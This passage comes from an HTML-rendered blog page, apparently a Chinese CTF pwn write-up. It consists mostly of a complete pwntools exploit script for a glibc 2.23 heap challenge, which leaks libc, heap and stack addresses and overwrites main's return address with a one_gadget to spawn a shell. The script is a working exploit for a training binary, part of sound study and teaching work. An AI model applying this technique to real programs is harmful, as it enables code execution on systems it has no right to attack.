class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>main_ret <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">30</span> <span class=\"token comment\"># main_ret_addr 固定偏移 8*30</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'Q'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp:</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">\"/home/yhuan/Desktop/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(SIZE)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'D'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'E'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(Y/n)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Y'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>unsortedbin_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'unsortedbin_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>main_arena <span class=\"token operator\">=</span> unsortedbin_addr <span class=\"token operator\">-</span> <span class=\"token number\">88</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>libc_base <span class=\"token operator\">=</span> main_arena <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 2\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>heap_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>heap_base <span class=\"token operator\">=</span> heap_addr <span class=\"token operator\">-</span> <span class=\"token number\">0xe0</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>tinypad <span class=\"token operator\">=</span> <span class=\"token number\">0x602040</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>offset <span class=\"token operator\">=</span> heap_base <span class=\"token operator\">-</span> tinypad</pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>pl1 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pl1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>env <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>pl3 <span class=\"token operator\">=</span> <span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x602148</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>pl3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>og <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>main_ret <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">30</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'Q'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td 